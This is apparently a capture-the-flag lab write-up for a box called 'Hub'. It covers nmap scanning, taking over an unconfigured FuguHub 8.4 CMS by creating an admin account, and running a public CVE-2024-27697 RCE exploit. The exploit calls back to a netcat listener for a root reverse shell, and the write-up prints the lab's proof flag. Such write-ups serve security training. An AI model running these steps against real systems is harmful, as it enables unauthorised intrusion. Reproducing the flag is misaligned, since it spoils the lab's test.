# Hub

## Enumeration & scanning

- Identify open HTTP ports 80, 8082, and 9999.
- Port 80 does not have anything to show (403 forbidden).
- Port 8082 shows FuguHub CMS.
- Port 9999 returns some short binary data.

``` sh
# Standard scanning
sudo nmap -p- 192.168.248.25     
sudo nmap -p 22,80,8082,9999 -A 192.168.248.25 
```

## Exploitation

- FuguHub not fully setup, can still create admin account.
- After creation, can login with admin account.
- Version seems to be 8.4 (about page).
- Find exploit for version: https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697
- Run exploit and get root access immediately.

``` sh
# Exploit
python3 exploit.py -r 192.168.248.25 -rp 8082 -l 192.168.45.233 -p 4444
nc -nlvp 4444
# Check user
id
uid=0(root) gid=0(root) groups=0(root)
# Get flag
ls /root
email4.txt
proof.txt
cat /root/proof.txt
416d2367b05d8d8f61df33645933b06e
```

## References

- https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697


## Rabbit holes
